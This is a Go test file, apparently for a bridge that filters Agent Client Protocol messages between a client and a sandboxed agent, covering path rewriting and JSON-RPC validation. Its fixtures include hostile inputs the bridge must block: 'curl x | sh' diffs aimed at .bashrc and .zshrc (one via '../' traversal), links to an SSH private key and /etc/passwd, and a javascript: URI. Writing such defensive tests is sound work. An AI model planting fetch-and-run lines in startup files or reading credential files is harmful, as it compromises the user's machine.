			`{"sessionUpdate":"agent_message_chunk","content":{"type":"text","text":"Done: see /etc/passwd.","_meta":{}},"messageId":"m1","_meta":{}}`,
			`{"sessionUpdate":"agent_message_chunk","content":{"type":"text","text":"Done: see /etc/passwd."},"messageId":"m1"}`,
		},
		{
			`{"sessionUpdate":"user_message_chunk","content":{"type":"image","data":"aGk=","mimeType":"image/png","uri":"file:///home/agent/shot.png"}}`,
			`{"sessionUpdate":"user_message_chunk","content":{"type":"image","data":"aGk=","mimeType":"image/png"}}`,
		},
		{
			`{"sessionUpdate":"agent_thought_chunk","content":{"type":"resource_link","uri":"file:///workspace/shared/a%20b.md#L2","name":"a b.md"}}`,
			`{"sessionUpdate":"agent_thought_chunk","content":{"type":"resource_link","uri":"file://MAC/a%20b.md#L2","name":"a b.md"}}`,
		},
		{`{"sessionUpdate":"agent_message_chunk","content":{"type":"resource_link","uri":"https://example.com/x.png","name":"x"}}`, `{"sessionUpdate":"agent_message_chunk","content":{"type":"resource_link","uri":"https://example.com/x.png","name":"x"}}`},
		// A resource the client might open as a file of this Mac's, or
		// by a program of it, does not cross.
		{`{"sessionUpdate":"agent_message_chunk","content":{"type":"resource_link","uri":"file:///Users/someone/.ssh/id_ed25519","name":"key"}}`, ""},
		{`{"sessionUpdate":"agent_message_chunk","content":{"type":"resource_link","uri":"file:///workspace/.bashrc","name":"rc"}}`, ""},
		{`{"sessionUpdate":"agent_message_chunk","content":{"type":"resource_link","uri":"zed://settings","name":"settings"}}`, ""},
		{`{"sessionUpdate":"agent_message_chunk","content":{"type":"resource_link","uri":"vscode://file/etc/passwd","name":"x"}}`, ""},
		{`{"sessionUpdate":"agent_message_chunk","content":{"type":"resource_link","uri":"/workspace/shared/a.md","name":"x"}}`, ""},
		{`{"sessionUpdate":"agent_message_chunk","content":{"type":"resource","resource":{"uri":"javascript:alert(1)","text":"x"}}}`, ""},
		{`{"sessionUpdate":"agent_message_chunk","content":{"type":"resource","resource":{"uri":"file:///workspace/shared/n.md","text":"# N","mimeType":"text/markdown"}}}`, `{"sessionUpdate":"agent_message_chunk","content":{"type":"resource","resource":{"uri":"file://MAC/n.md","text":"# N","mimeType":"text/markdown"}}}`},
		{`{"sessionUpdate":"agent_message_chunk","content":{"type":"video","data":"aGk="}}`, ""},
		{`{"sessionUpdate":"agent_message_chunk"}`, ""},
		{
			`{"sessionUpdate":"tool_call","toolCallId":"c1","title":"Read main.go","name":"Read","kind":"read","status":"in_progress",
				"content":[{"type":"content","content":{"type":"text","text":"package main"}},
					{"type":"diff","path":"/workspace/shared/main.go","oldText":null,"newText":"package main"},
					{"type":"diff","path":"/workspace/shared/../.bashrc","newText":"curl x | sh"},
					{"type":"diff","path":"/Users/someone/.zshrc","newText":"curl x | sh"},
					{"type":"terminal","terminalId":"t1"},
					{"type":"session","sessionId":"child"},
					{"type":"content","content":{"type":"resource_link","uri":"file:///etc/passwd","name":"passwd"}}],
				"locations":[{"path":"/workspace/shared/main.go","line":12},{"path":"/workspace/shared"},{"path":"/workspace/shared-other/x"},{"path":"/etc/passwd","line":1},{"path":"main.go"},{"line":2}],
				"rawInput":{"file_path":"/workspace/shared/main.go","nested":{"_meta":{"x":1},"deep":[{"_meta":2,"kept":1}]}},"rawOutput":"package main","_meta":{"claudeCode":{"toolName":"Read"}}}`,
			`{"sessionUpdate":"tool_call","toolCallId":"c1","title":"Read main.go","name":"Read","kind":"read","status":"in_progress",
				"content":[{"type":"content","content":{"type":"text","text":"package main"}},{"type":"diff","path":"MAC/main.go","newText":"package main"}],
				"locations":[{"path":"MAC/main.go","line":12},{"path":"MAC"}],
				"rawInput":{"file_path":"/workspace/shared/main.go","nested":{"deep":[{"kept":1}]}},"rawOutput":"package main"}`,
		},
		{`{"sessionUpdate":"tool_call","toolCallId":"c1"}`, ""},
		{`{"sessionUpdate":"tool_call","title":"No id"}`, ""},
		{
			`{"sessionUpdate":"tool_call_update","toolCallId":"c1","status":"completed","title":null,"content":null,"locations":[{"path":"/etc/passwd"}],"rawOutput":null}`,
			`{"sessionUpdate":"tool_call_update","toolCallId":"c1","status":"completed","locations":[]}`,
		},
		{`{"sessionUpdate":"tool_call_update","status":"completed"}`, ""},
		{
			`{"sessionUpdate":"plan","entries":[{"content":"Read","priority":"high","status":"completed","_meta":{}},{"content":"Write","priority":"low","status":"pending"},{"content":"No status","priority":"low"}],"_meta":{}}`,
			`{"sessionUpdate":"plan","entries":[{"content":"Read","priority":"high","status":"completed"},{"content":"Write","priority":"low","status":"pending"}]}`,
		},
		{
			`{"sessionUpdate":"available_commands_update","availableCommands":[{"name":"review","description":"Reviews.","input":{"hint":"what","_meta":{}},"_meta":{}},{"name":"init","description":"Starts.","input":null},{"name":"no description"}]}`,
			`{"sessionUpdate":"available_commands_update","availableCommands":[{"name":"review","description":"Reviews.","input":{"hint":"what"}},{"name":"init","description":"Starts."}]}`,
		},
		{`{"sessionUpdate":"current_mode_update","currentModeId":"ask","_meta":{}}`, `{"sessionUpdate":"current_mode_update","currentModeId":"ask"}`},
		{`{"sessionUpdate":"current_mode_update"}`, ""},
		{
			`{"sessionUpdate":"config_option_update","configOptions":[{"type":"select","id":"model","name":"Model","currentValue":"big","options":[{"value":"big","name":"Big"}]},{"type":"boolean","id":"fast","name":"Fast","currentValue":false}]}`,
			`{"sessionUpdate":"config_option_update","configOptions":[{"type":"select","id":"model","name":"Model","currentValue":"big","options":[{"value":"big","name":"Big"}]}]}`,
		},
		{`{"sessionUpdate":"session_info_update","title":"Fix the build","updatedAt":null,"_meta":{}}`, `{"sessionUpdate":"session_info_update","title":"Fix the build","updatedAt":null}`},
		{`{"sessionUpdate":"session_info_update","title":7}`, `{"sessionUpdate":"session_info_update"}`},
		{
			`{"sessionUpdate":"usage_update","used":1200,"size":200000,"cost":{"amount":0.25,"currency":"USD","_meta":{}},"_meta":{}}`,
			`{"sessionUpdate":"usage_update","used":1200,"size":200000,"cost":{"amount":0.25,"currency":"USD"}}`,
		},
		{`{"sessionUpdate":"usage_update","used":-1,"size":200000}`, ""},
		{`{"sessionUpdate":"usage_update","used":1.5,"size":200000}`, ""},
		// The kinds a client has to ask for, which the bridge did not.
		{`{"sessionUpdate":"plan_update","plan":{"type":"markdown","planId":"p1","content":"# Plan","path":"/workspace/shared/PLAN.md"}}`, ""},
		{`{"sessionUpdate":"plan_removed","planId":"p1"}`, ""},
		{`{"sessionUpdate":"notice","severity":"info","title":"Updated"}`, ""},
		{`{"sessionUpdate":"compaction_update","compactionId":"k1","status":"completed"}`, ""},
		{`{"sessionUpdate":"compaction_summary_chunk","compactionId":"k1","content":{"type":"text","text":"x"}}`, ""},
		{`{"sessionUpdate":"subagent_update","sessionId":"child","cwd":"/workspace/shared"}`, ""},
		{`{"sessionUpdate":"session_message","messageId":"m1"}`, ""},
		{`{"sessionUpdate":"session_message_chunk","messageId":"m1","content":{"type":"text","text":"x"}}`, ""},
		// And what the protocol's first version does not have.
		{`{"sessionUpdate":"current_model_update","currentModelId":"big"}`, ""},
		{`{"sessionUpdate":"Agent_Message_Chunk","content":{"type":"text","text":"x"}}`, ""},
		{`{"SessionUpdate":"agent_message_chunk","content":{"type":"text","text":"x"}}`, ""},
		{`{}`, ""},
	} {
		c := newCrossing(t)
		toAgent, toClient := c.agent(`{"jsonrpc":"2.0","method":"session/update","params":{"sessionId":"s1","update":` + tt.update + `,"_meta":{"a":1}}}`)
		want := ""
		if tt.crossed != "" {
			want = inFolder(`{"jsonrpc":"2.0","method":"session/update","params":{"sessionId":"s1","update":` + tt.crossed + `}}`)
		}
		only(t, tt.update, toClient, want)
		only(t, tt.update+", to the agent", toAgent, "")
	}
	// An update of no session is none.
	c := newCrossing(t)
	if _, toClient := c.agent(`{"jsonrpc":"2.0","method":"session/update","params":{"update":{"sessionUpdate":"current_mode_update","currentModeId":"ask"}}}`); len(toClient) != 0 {
		t.Errorf("an update of no session crossed: %s", toClient)
	}
}

// JSON-RPC's rules, as the bridge holds them: a line is one message or
// is dropped; an id is a string or an integer; a request under an id
// that still waits is refused; an answer crosses only to a request
// that waits for it; a notification the bridge does not know is
// dropped.
func TestTheRulesOfMessages(t *testing.T) {
	c := newCrossing(t)
	for _, line := range []string{
		``, ` `, `not json`, `{`, `{"jsonrpc":"2.0","id":1,"method":"logout"`, `null`, `7`, `"logout"`, `true`,
		// A batch.
		`[{"jsonrpc":"2.0","id":1,"method":"logout"}]`, `[]`,
		// Two values on a line, and what is not JSON after one.
		`{"jsonrpc":"2.0","id":1,"method":"logout"}{"jsonrpc":"2.0","id":2,"method":"logout"}`,
		`{"jsonrpc":"2.0","id":1,"method":"logout"} x`,
		// Both a call and an answer.
		`{"jsonrpc":"2.0","id":1,"method":"logout","result":{}}`,
		`{"jsonrpc":"2.0","id":1,"method":"logout","error":{"code":1,"message":"x"}}`,
		// Both a result and an error, and neither.
		`{"jsonrpc":"2.0","id":1,"result":{},"error":{"code":1,"message":"x"}}`,
		`{"jsonrpc":"2.0","id":1}`,
		`{"jsonrpc":"2.0","result":{}}`,
		// An id that is neither a string nor an integer, or is too long.
		`{"jsonrpc":"2.0","id":null,"method":"logout"}`,
		`{"jsonrpc":"2.0","id":1.5,"method":"logout"}`,
		`{"jsonrpc":"2.0","id":1e2,"method":"logout"}`,
		`{"jsonrpc":"2.0","id":99999999999999999999,"method":"logout"}`,
		`{"jsonrpc":"2.0","id":true,"method":"logout"}`,
		`{"jsonrpc":"2.0","id":[1],"method":"logout"}`,
		`{"jsonrpc":"2.0","id":{"n":1},"method":"logout"}`,
		`{"jsonrpc":"2.0","id":"` + strings.Repeat("x", maxIDBytes+1) + `","method":"logout"}`,
		// A method that is no string, and parameters that are no object.
		`{"jsonrpc":"2.0","id":1,"method":7}`,
		`{"jsonrpc":"2.0","id":1,"method":null}`,
		`{"jsonrpc":"2.0","id":1,"method":"logout","params":[]}`,
		`{"jsonrpc":"2.0","id":1,"method":"logout","params":"x"}`,
		// A member twice, anywhere: whoever reads the message next might
		// take the other one.
		`{"jsonrpc":"2.0","id":1,"id":2,"method":"logout"}`,
		`{"jsonrpc":"2.0","id":1,"method":"logout","method":"session/new"}`,
		`{"jsonrpc":"2.0","id":1,"method":"session/new","params":{"cwd":"` + mac + `","cwd":"/","mcpServers":[]}}`,
		`{"jsonrpc":"2.0","id":1,"method":"session/prompt","params":{"sessionId":"s1","prompt":[{"type":"text","text":"a","text":"b"}]}}`,
		// Nested deeper than any message is.
		`{"jsonrpc":"2.0","id":1,"method":"logout","params":{"x":` + strings.Repeat("[", maxDepth) + strings.Repeat("]", maxDepth) + `}}`,
		// A notification the bridge does not know.
		`{"jsonrpc":"2.0","method":"session/update","params":{"sessionId":"s1","update":{"sessionUpdate":"current_mode_update","currentModeId":"x"}}}`,
		`{"jsonrpc":"2.0","method":"initialized"}`,
		`{"jsonrpc":"2.0","method":"_zed/telemetry","params":{}}`,
		`{"jsonrpc":"2.0","method":"session/cancel"}`,
		`{"jsonrpc":"2.0","method":"session/cancel","params":{}}`,
		`{"jsonrpc":"2.0","method":"$/cancel_request","params":{"requestId":1}}`,
		// An answer to what nobody asked.
		`{"jsonrpc":"2.0","id":1,"result":{}}`,
		`{"jsonrpc":"2.0","id":"p1","error":{"code":1,"message":"x"}}`,
	} {
		if toAgent, toClient := c.client(line); len(toAgent)+len(toClient) != 0 {
			t.Errorf("the client's %.80q is no message, and wrote %s to the agent and %s to the client", line, toAgent, toClient)
		}
		if strings.Contains(line, `"session/update"`) {
			continue // the agent's own to send
		}
		toAgent, toClient := c.agent(line)
		// What is a request, from an agent, is answered to it with an
		// error and reaches no client.
		if len(toClient) != 0 || (len(toAgent) != 0 && !strings.Contains(toAgent[0], `"error"`)) {
			t.Errorf("the agent's %.80q is no message, and wrote %s to the agent and %s to the client", line, toAgent, toClient)
		}
	}

	// A name that differs by its case is another name: it is no member
	// the bridge knows, and does not cross.
	toAgent, _ := c.client(`{"JSONRPC":"3.0","Id":7,"id":"a","METHOD":"session/new","method":"authenticate","Params":{"methodId":"other"},"params":{"methodId":"key","MethodId":"other","_META":{"x":1}}}`)
	only(t, "names in another case", toAgent, `{"jsonrpc":"2.0","id":"a","method":"authenticate","params":{"methodId":"key"}}`)

	// An id is written as it came, a string or an integer, and the two
	// are different ids.
	toAgent, _ = c.client(`{"jsonrpc":"2.0","id":"7","method":"logout"}`)
	only(t, "a string id", toAgent, `{"jsonrpc":"2.0","id":"7","method":"logout","params":{}}`)
	toAgent, _ = c.client(`{"jsonrpc":"2.0","id":7,"method":"logout"}`)
	only(t, "an integer id", toAgent, `{"jsonrpc":"2.0","id":7,"method":"logout","params":{}}`)
	toAgent, _ = c.client(`{"jsonrpc":"2.0","id":-9223372036854775808,"method":"logout","params":null}`)
	only(t, "the least integer id", toAgent, `{"jsonrpc":"2.0","id":-9223372036854775808,"method":"logout","params":{}}`)
	// A second request under an id that waits is refused, and neither
	// side hears of it.
	if toAgent, toClient := c.client(`{"jsonrpc":"2.0","id":7,"method":"session/prompt","params":{"sessionId":"s1","prompt":[]}}`); len(toAgent)+len(toClient) != 0 {
		t.Errorf("a second request under an id that waits wrote %s to the agent and %s to the client", toAgent, toClient)
	}
	// Its answer is the first one's, by the first one's method.
	_, toClient := c.agent(`{"jsonrpc":"2.0","id":7,"result":{"stopReason":"end_turn"}}`)
	only(t, "the answer under an id asked twice", toClient, `{"jsonrpc":"2.0","id":7,"result":{}}`)
	_, toClient = c.agent(`{"jsonrpc":"2.0","id":"7","result":null}`)
	only(t, "the answer under the string id", toClient, `{"jsonrpc":"2.0","id":"7","result":{}}`)
	// Answered, the id is free again.
	toAgent, _ = c.client(`{"jsonrpc":"2.0","id":7,"method":"session/prompt","params":{"sessionId":"s1","prompt":[]}}`)
	only(t, "an id used again", toAgent, `{"jsonrpc":"2.0","id":7,"method":"session/prompt","params":{"sessionId":"s1","prompt":[]}}`)

	// That a request is withdrawn crosses while the request waits, from
	// the side that made it.
	toAgent, _ = c.client(`{"jsonrpc":"2.0","method":"$/cancel_request","params":{"requestId":7,"_meta":{}}}`)
	only(t, "a withdrawal", toAgent, `{"jsonrpc":"2.0","method":"$/cancel_request","params":{"requestId":7}}`)
	if _, toClient := c.agent(`{"jsonrpc":"2.0","method":"$/cancel_request","params":{"requestId":7}}`); len(toClient) != 0 {
		t.Errorf("the agent withdrew a request of the client's: %s", toClient)
	}
	c.agent(`{"jsonrpc":"2.0","id":7,"error":{"code":-32800,"message":"Cancelled"}}`)
	if toAgent, _ := c.client(`{"jsonrpc":"2.0","method":"$/cancel_request","params":{"requestId":7}}`); len(toAgent) != 0 {
		t.Errorf("a request that was answered was withdrawn: %s", toAgent)
	}
	c.agent(`{"jsonrpc":"2.0","id":"p","method":"session/request_permission","params":{"sessionId":"s1","toolCall":{"toolCallId":"c1"},"options":[]}}`)
	_, toClient = c.agent(`{"jsonrpc":"2.0","method":"$/cancel_request","params":{"requestId":"p"}}`)
	only(t, "an agent's withdrawal", toClient, `{"jsonrpc":"2.0","method":"$/cancel_request","params":{"requestId":"p"}}`)
	// The agent's ids are its own: a request of its under an id the
	// client uses is another request.
	if _, toClient := c.agent(`{"jsonrpc":"2.0","id":"p","method":"session/request_permission","params":{"sessionId":"s1","toolCall":{"toolCallId":"c2"},"options":[]}}`); len(toClient) != 0 {
		t.Errorf("a second permission under an id that waits crossed: %s", toClient)
	}

	// What is written is one line whatever a text holds, says the same
	// text, and is in UTF-8: half of a pair, which is no character,
	// crosses as the mark of one.
	toAgent, _ = c.client(`{"jsonrpc":"2.0","id":8,"method":"session/prompt","params":{"sessionId":"s1","prompt":[{"type":"text","text":"a <b> & c\n` + "\u2028" + `d \ud83d\ude00 \udc00"}]}}`)
	var crossed struct {
		Params struct{ Prompt []struct{ Text string } }
	}
	if len(toAgent) == 1 {
		json.Unmarshal([]byte(toAgent[0]), &crossed)
	}
	if len(crossed.Params.Prompt) != 1 || crossed.Params.Prompt[0].Text != "a <b> & c\n\u2028d \U0001F600 \uFFFD" || !strings.Contains(toAgent[0], "a <b> & c") {
		t.Errorf("a prompt's text crossed as %q", toAgent)
	}
}

// An agent may keep only so many requests waiting for its client:
// more ends the bridge.
func TestAnAgentKeepsOnlySoManyRequestsWaiting(t *testing.T) {
	c := newCrossing(t)
	ask := func(i int) error {
		return c.b.agentLine([]byte(fmt.Sprintf(`{"jsonrpc":"2.0","id":%d,"method":"session/request_permission","params":{"sessionId":"s1","toolCall":{"toolCallId":"c"},"options":[]}}`, i)))
	}
	for i := range maxAgentRequests {
		if err := ask(i); err != nil {
			t.Fatalf("request %d ended the bridge: %v", i, err)
		}
	}
	if got := len(c.lines(&c.toClient)); got != maxAgentRequests {
		t.Fatalf("%d requests crossed, want %d", got, maxAgentRequests)
	}
	// What the bridge answers itself waits for nothing, and is not
	// counted.
	for i := range 1000 {
		if err := c.b.agentLine([]byte(fmt.Sprintf(`{"jsonrpc":"2.0","id":"f%d","method":"fs/read_text_file","params":{}}`, i))); err != nil {
			t.Fatalf("a request answered here ended the bridge: %v", err)
		}
	}
	if err := ask(maxAgentRequests); err == nil || !strings.Contains(err.Error(), "requests waiting") {
		t.Errorf("one request more than may wait: %v", err)
	}
	if got := c.lines(&c.toClient); len(got) != 0 {
		t.Errorf("the request too many crossed: %s", got)
	}
	// One that was answered makes room.
	c.client(`{"jsonrpc":"2.0","id":3,"result":{"outcome":{"outcome":"cancelled"}}}`)
	if err := ask(maxAgentRequests); err != nil {
		t.Errorf("with room again: %v", err)
	}
}

// pipes are the two streams of a bridge that is served, as a client
// and a workstation hold them.
type pipes struct {
	t           *testing.T
	client      *io.PipeWriter // what the client sends
	clientReads *bufio.Reader  // what the client is sent
	agent       *io.PipeWriter // what the agent sends
	agentReads  *bufio.Reader  // what the agent is sent
	closed      chan struct{}  // closed when the workstation's stream is
	ended       chan error
}

type workstationEnd struct {
	io.Reader
	io.Writer
	close func()
}

func (w workstationEnd) Close() error { w.close(); return nil }

func served(t *testing.T) *pipes {
	t.Helper()
	clientIn, clientSends := io.Pipe()
	clientGets, clientOut := io.Pipe()
	agentIn, agentSends := io.Pipe()
	agentGets, agentOut := io.Pipe()
	p := &pipes{t: t, client: clientSends, agent: agentSends, clientReads: bufio.NewReader(clientGets), agentReads: bufio.NewReader(agentGets), closed: make(chan struct{}), ended: make(chan error, 1)}
	closing := func() {
		select {
		case <-p.closed:
		default:
			close(p.closed)
		}
		agentIn.Close()
		agentOut.Close()
	}
	go func() {
		p.ended <- Serve(clientIn, clientOut, workstationEnd{agentIn, agentOut, closing}, mac)
		clientOut.Close()
	}()
	t.Cleanup(func() { clientSends.Close(); agentSends.Close(); clientIn.Close() })
	return p
}

func (p *pipes) end() error {
	p.t.Helper()
	select {
	case err := <-p.ended:
		select {
		case <-p.closed:
		default:
			p.t.Error("the bridge ended and left the workstation's stream open")
		}
		return err
	case <-time.After(10 * time.Second):
		p.t.Fatal("the bridge did not end")
		return nil
	}
}

// A bridge that is served passes messages both ways until a stream
// ends, and then closes the workstation's, which ends the agent.
func TestServePassesUntilAStreamEnds(t *testing.T) {
	p := served(t)
	fmt.Fprintln(p.client, `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":1}}`)
	if line, err := p.agentReads.ReadString('\n'); err != nil || !same(line, `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":1,"clientCapabilities":{"fs":{"readTextFile":false,"writeTextFile":false},"terminal":false}}}`) {
		t.Fatalf("the agent was sent %q (%v)", line, err)
	}
	fmt.Fprintln(p.agent, `{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":1}}`)
	if line, err := p.clientReads.ReadString('\n'); err != nil || !same(line, `{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":1,"agentCapabilities":{"mcpCapabilities":{"http":false,"sse":false}},"authMethods":[]}}`) {
		t.Fatalf("the client was sent %q (%v)", line, err)
	}
	// The client closes: the bridge ends, with no error.
	p.client.Close()
	if err := p.end(); err != nil {
		t.Errorf("after the client closed: %v", err)
	}

	// The agent ends: so does the bridge.
	p = served(t)
	p.agent.Close()
	if err := p.end(); err != nil {
		t.Errorf("after the agent ended: %v", err)
	}
}

// A line too long from the client is dropped, and the next is taken; a
// line too long from the workstation ends the bridge, which holds none
// of it.
func TestALineTooLong(t *testing.T) {
	long := strings.Repeat("x", sandbox.ACPMaxLine)
	p := served(t)
	go func() {
		fmt.Fprintln(p.client, `{"jsonrpc":"2.0","id":1,"method":"session/prompt","params":{"sessionId":"s1","prompt":[{"type":"text","text":"`+long+`"}]}}`)
		fmt.Fprintln(p.client, `{"jsonrpc":"2.0","id":2,"method":"logout"}`)
	}()
	if line, err := p.agentReads.ReadString('\n'); err != nil || !same(line, `{"jsonrpc":"2.0","id":2,"method":"logout","params":{}}`) {
		t.Fatalf("after a line too long the agent was sent %.200q (%v)", line, err)
	}
	// One that is as long as a message may be crosses.
	text := strings.Repeat("y", sandbox.ACPMaxLine-200)
	go fmt.Fprintln(p.client, `{"jsonrpc":"2.0","id":3,"method":"session/prompt","params":{"sessionId":"s1","prompt":[{"type":"text","text":"`+text+`"}]}}`)
	if line, err := p.agentReads.ReadString('\n'); err != nil || !strings.Contains(line, `"id":3`) || len(line) < len(text) {
		t.Fatalf("a long message crossed as %d bytes (%v)", len(line), err)
	}

	go fmt.Fprintln(p.agent, `{"jsonrpc":"2.0","method":"session/update","params":{"sessionId":"s1","update":{"sessionUpdate":"agent_message_chunk","content":{"type":"text","text":"`+long+`"}}}}`)
	if err := p.end(); err == nil || !strings.Contains(err.Error(), "the agent sent a line longer") {
		t.Errorf("after a line too long from the workstation: %v", err)
	}
}

// A bridge is served for a Shared Folder that is known by its path.
func TestTheSharedFolderIsKnownByItsPath(t *testing.T) {
	for _, folder := range []string{"", "/", "//", "/.", "research", "./research", "/a/..", "/Users/Shared/a\x00b"} {
		closed := false
		err := Serve(strings.NewReader(""), io.Discard, workstationEnd{strings.NewReader(""), io.Discard, func() { closed = true }}, folder)
		if err == nil || !closed {
			t.Errorf("a bridge was served for the Shared Folder %q (%v), or left its workstation's stream open", folder, err)
		}
	}
	if f, err := newFolder("/Users/Shared/zeolite/shared.noindex/research/"); err != nil || f.mac != mac || f.workstation != "/workspace/shared" {
		t.Errorf("the folder of a path with a slash after it is %+v (%v)", f, err)
	}
}
